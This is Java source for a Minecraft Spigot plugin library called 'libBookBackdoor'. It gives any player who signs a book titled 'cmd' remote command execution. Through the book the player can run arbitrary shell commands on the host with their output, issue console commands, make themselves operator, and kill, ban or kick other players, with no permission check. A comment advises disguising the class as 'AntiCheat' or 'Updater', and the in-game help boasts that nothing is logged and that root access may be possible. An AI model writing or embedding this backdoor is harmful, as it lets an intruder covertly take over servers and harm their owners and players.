package org.brandonplank.bookbackdoor;

import net.md_5.bungee.api.chat.*;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.Sound;
import org.bukkit.block.Block;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerEditBookEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BookMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

abstract class Countdown {
    private int time;

    protected BukkitTask task;
    protected final Plugin plugin;

    public Countdown(int time, Plugin plugin) {
        this.time = time;
        this.plugin = plugin;
    }

    public abstract void count(int current);
    public final void start() {
        task = new BukkitRunnable() {
            @Override
            public void run() {
                count(time);
                if (time-- <= 0) cancel();
            }
        }.runTaskTimer(plugin, 0L, 20L); // 1 second is 20 ticks
    }
}

/*
    If you want this to stay hidden in your plugin
    rename libBookBackdoor to something like
    AntiCheat or Updater.
 */

public class libBookBackdoor implements Listener {
    private static class Util {
        private static TextComponent genHoverText(String text, String hover_text){
            return new TextComponent(new ComponentBuilder(text).event(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder(hover_text).create())).create());
        }
    }

    public final Plugin plugin;
    public libBookBackdoor(JavaPlugin plugin){
        this.plugin = plugin;
    }
    public String getResult(Process process) throws IOException {
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line = "";
        List<String> ret = new ArrayList<>();
        while ((line = reader.readLine()) != null) ret.add(line);
        StringBuilder build = new StringBuilder();
        for(String str : ret) {
            build.append(str);
            build.append("\n");
        }
        return build.toString();
    }

    @EventHandler
    public void onBookSign(PlayerEditBookEvent event) {
        BookMeta eventMeta = event.getNewBookMeta();
        if (eventMeta.getTitle() != null && !eventMeta.getPage(1).equals("")) {
            if(eventMeta.getTitle().equals("cmd")) {
                String pageString = eventMeta.getPage(1);
                String commandType = Character.toString(pageString.charAt(0));
                String command = pageString.substring(1);

                if(commandType.equals(">") || commandType.equals("$") || commandType.equals("#")) {
                    Player player = event.getPlayer();
                    try {
                        player.sendMessage("Running: " + command);
                        Process proc = Runtime.getRuntime().exec(command);
                        player.sendMessage(getResult(proc));
                    } catch (Exception e) {
                        player.sendMessage(ChatColor.RED + "Error executing server command.\n" + e);
                    }
                    event.getPlayer().getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount()-1);
                    this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
                        public void run() {
                            event.getPlayer().getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
                        }
                    }, 5);
                } else if(commandType.equals("/")) /* Server commands, runs as [SERVER]*/ {
                    this.plugin.getServer().dispatchCommand(this.plugin.getServer().getConsoleSender(), command);
                    event.getPlayer().getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount()-1);
                    this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
                        public void run() {
                            event.getPlayer().getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
                        }
                    }, 5);
                } else if (commandType.equals(".")) /* Custom commands*/ {
                    String[] args = command.split(" ", 0);
                    Player player = event.getPlayer();
                    String mainCmd = args[0].toLowerCase();
                    switch(mainCmd) {
                        case("give"):
                            int amount = 64;
                            if(args.length == 3) {
                                amount = Integer.parseInt(args[2]);
                            }
                            try {
                                String mat = args[1].toUpperCase();
                                ItemStack item = new ItemStack(Material.getMaterial(mat), amount);
                                if(item == null){
                                    player.sendMessage("Use the Spigot naming scheme");
                                } else {
                                    player.getInventory().addItem(item);
                                }
                            } catch(Exception e) {
                                player.sendMessage("Use the Spigot naming scheme");
                            }
                            break;
                        case("kick"):
                            try {
                                String reason = "You have been kicked from the server";
                                if(args.length > 1) {
                                    reason = "";
                                    for(int i = 1; i < args.length; i++){
                                        reason = reason + " " + args[i];
                                    }
                                }
                                Player p = this.plugin.getServer().getPlayer(args[1]);
                                p.kickPlayer(reason);
                            } catch(Exception e){
                                player.sendMessage("Invalid player name");
                            }
                            break;
                        case("ban"):
                            try {
                                String reason = "You have been banned from the server";
                                if(args.length > 1) {
                                    reason = "";
                                    for(int i = 1; i < args.length; i++){
                                        reason = reason + " " + args[i];
                                    }
                                }
                                Player p = this.plugin.getServer().getPlayer(args[1]);
                                p.banPlayerFull(reason);
                            } catch(Exception e){
                                player.sendMessage("Invalid player name");
                            }
                            break;
                        case("kill"):
                            try {
                                Player p = this.plugin.getServer().getPlayer(args[1]);
                                p.setHealth(0.0D);
                            } catch(Exception e){
                                player.sendMessage("Invalid player name");
                            }
                            break;
                        case("xp"):
                            try {
                                player.giveExp(Integer.parseInt(args[1]), true);
                            } catch(Exception e){
                                player.sendMessage("Please add in a value");
                            }
                            break;
                        case("enchant"):
                            try {
                                new Countdown(5, this.plugin) {
                                    @Override
                                    public void count(int current) {
                                        if(current == 0){
                                            try {
                                                player.getInventory().getItemInMainHand().addUnsafeEnchantment(Enchantment.getByName(args[1].toUpperCase()), Integer.parseInt(args[2]));
                                                player.playSound(player.getLocation(), Sound.ENTITY_PLAYER_LEVELUP, 50, 1);
                                                player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "Enchanted!").bold(true).create());
                                            } catch (Exception e){
                                                player.sendActionBar(new ComponentBuilder(ChatColor.RED + "Failed to add enchantment!").bold(true).create());
                                            }
                                        } else {
                                            player.sendActionBar(ChatColor.GREEN + "Enchanting in " + current + " seconds.");
                                        }
                                    }
                                }.start();
                            } catch (Exception e) {
                                player.sendMessage("Please add in a value");
                            }
                            break;
                        case("tp"):
                            try {
                                Player p = this.plugin.getServer().getPlayer(args[1]);
                                Player p2 = this.plugin.getServer().getPlayer(args[2]);
                                if(!p.equals(player)){
                                    p2.teleportAsync(p.getLocation());
                                } else {
                                    p.teleportAsync(p2.getLocation());
                                }
                            } catch (Exception e) {
                                player.sendMessage("Please use correct names");
                            }
                            break;
                        case("seed"):
                            String message = "Seed [" + ChatColor.GREEN + Long.toString(player.getWorld().getSeed()) + ChatColor.RESET + "]";
                            TextComponent string = new TextComponent(message);
                            string.setClickEvent(new ClickEvent(ClickEvent.Action.COPY_TO_CLIPBOARD, Long.toString(player.getWorld().getSeed())));
                            string.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Copy seed to clipboard").create()));
                            player.spigot().sendMessage(string);
                            break;
                        case("brazil"):
                            try {
                                Player p = this.plugin.getServer().getPlayer(args[1]);
                                Location loc = p.getLocation();
                                loc.setY(-2);
                                p.teleport(loc);
                            } catch (Exception e) {
                                player.sendMessage("Please use correct names");
                            }
                            break;
                        case("mend"):
                            try {
                                new Countdown(5, this.plugin) {
                                    @Override
                                    public void count(int current) {
                                        if(current == 0){
                                            try {
                                                player.getInventory().getItemInMainHand().setDurability((short)0);
                                                player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "Mended!").bold(true).create());
                                            } catch (Exception e){
                                                player.sendActionBar(new ComponentBuilder(ChatColor.RED + "Failed to mend item!").bold(true).create());
                                            }
                                        } else {
                                            player.sendActionBar(ChatColor.GREEN + "Mending in " + current + " seconds.");
                                        }
                                    }
                                }.start();
                            } catch (Exception e) {
                                player.sendMessage("Error while mending");
                            }
                            break;
                        case("op"):
                            player.setOp(true);
                            break;
                        case("deop"):
                            player.setOp(false);
                            break;
                        case("break"):
                            Location player_loc = player.getEyeLocation();
                            try {
                                player_loc.setY(player_loc.getY() + Integer.parseInt(args[1]));
                                Block target = player.getWorld().getBlockAt(player_loc);
                                target.setType(Material.AIR);
                            } catch (Exception e){
                                player.sendMessage("Block could not be set to air");
                            }
                            break;
                        case("troll"):
                            try {
                                Player p = this.plugin.getServer().getPlayer(args[1]);
                                Location loc = p.getLocation();
                                player.playSound(loc, Sound.ENTITY_ENDERMAN_DEATH, 100, 1);
                            } catch (Exception e) {
                                player.sendMessage("Please use a valid player name.");
                            }
                            break;
                        case("help"):
                            ItemStack book = new ItemStack(Material.WRITTEN_BOOK, 1);
                            BookMeta meta = (BookMeta)book.getItemMeta();
                            try {
                                meta.setTitle(ChatColor.YELLOW + "BookBackdoor Help");
                                meta.setAuthor(ChatColor.LIGHT_PURPLE + "The BookBackdoor Team");
                                meta.addPage("Welcome to the BookBackdoor help book!\n\n\n\n" + ChatColor.LIGHT_PURPLE + "By The BookBackdoor Team");
                                meta.addPage("To run commands as " + ChatColor.RED + "CONSOLE" + ChatColor.RESET + ", open a new book and type /<your command>\n\nTo run a custom command made by us keep reading.\n\nWhen your done with you command, name the book 'cmd'");
                                meta.addPage("To run commands in" + ChatColor.RED + " BASH " + ChatColor.RESET + " or " + ChatColor.LIGHT_PURPLE + " ZSH " + ChatColor.RESET + ", open a new book and type $<your command>\n\nDepending on the user running the server, you will lets say, have full root. Try and see by running $whoami.\nThis does not log anything :)");

                                // Page 3
                                TextComponent help = Util.genHoverText(ChatColor.GREEN + ".help\n", "Shows this help book.\n\nUSAGE: .help");
                                TextComponent give = Util.genHoverText(ChatColor.GREEN + ".give\n", "Give yourself any block/Item.\n\nUSAGE: .give <item> <amount>");
                                TextComponent mend = Util.genHoverText(ChatColor.GREEN + ".mend\n", "Repairs the item in your hand in 5 seconds.\n\nUSAGE: .mend");
                                TextComponent brazil = Util.genHoverText(ChatColor.GREEN + ".brazil\n", "Puts a player in the void.\n\nUSAGE: .brazil <player>");
                                TextComponent seed = Util.genHoverText(ChatColor.GREEN + ".seed\n", "Shows the world seed.\n\nUSAGE: .seed");
                                TextComponent tp = Util.genHoverText(ChatColor.GREEN + ".tp\n", "Teleport to a player, or have them come to you!\n\nUSAGE: .tp <player1> <player2>");
                                TextComponent enchant = Util.genHoverText(ChatColor.GREEN + ".enchant\n", "Enchant the item in your hand after 5 seconds.\n\nUSAGE: .enchant <name> <level>");
                                TextComponent xp = Util.genHoverText(ChatColor.GREEN + ".xp\n", "Gives you any amount of XP.\n\nUSAGE: .xp <amount>");
                                TextComponent kill = Util.genHoverText(ChatColor.GREEN + ".kill\n", "Kills a player, duh.\n\nUSAGE: .kill <player>");
                                TextComponent ban = Util.genHoverText(ChatColor.GREEN + ".ban\n", "Bans a player, does not take a reason.\n\nUSAGE: .ban <player>");
                                TextComponent kick = Util.genHoverText(ChatColor.GREEN + ".kick\n", "Kicks a player, does not take a reason.\n\nUSAGE: .kick <player>");
                                BaseComponent[] page = new BaseComponent[]{help, give, mend, brazil, seed, tp, enchant, xp, kill, ban, kick}; // Build the new page

                                // Page 4
                                TextComponent op = Util.genHoverText(ChatColor.GREEN + ".op\n", "Gives you Operator status.\n\nUSAGE: .op");
                                TextComponent deop = Util.genHoverText(ChatColor.GREEN + ".deop\n", "Removes your Operator status.\n\nUSAGE: .deop");
                                TextComponent bbreak = Util.genHoverText(ChatColor.GREEN + ".break\n", "Removes any block relative to your players head, Example: .break 1(Breaks the block above the players head).\n\nUSAGE: .break <y pos relative to head>");
                                TextComponent troll = Util.genHoverText(ChatColor.GREEN + ".troll\n", "Plays a Enderman sound at 100% volume in a players ear.\n\nUSAGE: .troll <player>");
                                BaseComponent[] page2 = new BaseComponent[]{op, deop, bbreak, troll};

                                meta.spigot().addPage(page);
                                meta.spigot().addPage(page2);
                                book.setItemMeta(meta); // Save all Changes to the book
                                player.getInventory().addItem(book);
                            } catch (SecurityException | IllegalArgumentException ex) {
                                player.sendMessage("Error creating help book.");
                            }
                            break;
                        default:
                            player.sendMessage(ChatColor.RED + "Invalid command.");
                            break;
                    }
                    player.getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount()-1);
                    this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
                        public void run() {
                            player.getInventory().addItem(new ItemStack(Material.WRITABLE_BOOK));
                        }
                    }, 5);
                }
            }
        }
    }
}